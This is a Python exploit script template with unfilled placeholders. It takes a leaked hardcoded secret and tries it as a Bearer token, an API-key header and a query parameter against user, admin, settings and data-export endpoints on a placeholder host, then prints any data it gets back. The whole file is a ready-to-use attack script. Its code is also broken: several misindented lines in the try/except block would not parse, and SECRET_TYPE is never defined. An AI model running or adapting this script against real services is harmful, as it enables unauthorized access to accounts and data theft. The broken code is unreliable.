#!/usr/bin/env python3
"""
Hardcoded Secret Exploitation
Target: {{ package_name }}
Secret Type: {{ secret_type }}
"""

import requests
import json

# Extracted secret
SECRET_KEY = "{{ value }}"

# API endpoints that might use this secret
ENDPOINTS = [
    "/api/v1/user/profile",
    "/api/v1/admin/dashboard",
    "/api/v1/settings",
    "/api/v1/data/export"
]

def test_secret(url, secret):
    """Test if secret provides access to protected resources"""
    headers = {
        'Authorization': f'Bearer {secret}',
        'X-API-Key': secret,
        'API-Key': secret
    }

    try:
        # Try different authentication methods
        responses = []

        # Bearer token
        response = requests.get(url, headers={'Authorization': f'Bearer {secret}'})
        responses.append(('Bearer', response))

        # API Key header
        response = requests.get(url, headers={'X-API-Key': secret})
        responses.append(('X-API-Key', response))

        # Query parameter
        response = requests.get(f"{url}?api_key={secret}")
    responses.append(('Query Parameter', response))

    # Check responses
    for auth_type, response in responses:
        if response.status_code == 200:
            print(f"[+] Success with {auth_type}: Status {response.status_code}")
            print(f"[*] Response preview: {response.text[:200]}...")
            return True
        else:
            print(f"[-] Failed with {auth_type}: Status {response.status_code}")

    return False

except Exception as e:
print(f"[-] Error testing secret: {e}")
return False

def exploit():
    """Exploit hardcoded secret"""
    base_url = "http://api.target.com"

    print(f"[*] Exploiting hardcoded {SECRET_TYPE}")
    print(f"[*] Secret: {SECRET_KEY[:10]}..." if len(SECRET_KEY) > 10 else SECRET_KEY)

    # Test each endpoint
    for endpoint in ENDPOINTS:
        url = f"{base_url}{endpoint}"
        print(f"\n[*] Testing endpoint: {url}")

        if test_secret(url, SECRET_KEY):
            print(f"[+] Successfully accessed {endpoint}")

            # Try to extract more data
            try:
                response = requests.get(url, headers={'Authorization': f'Bearer {SECRET_KEY}'})
                data = response.json()

                print("[*] Extracted data:")
                print(json.dumps(data, indent=2)[:500] + "...")
            except:
                pass

if __name__ == "__main__":
    exploit()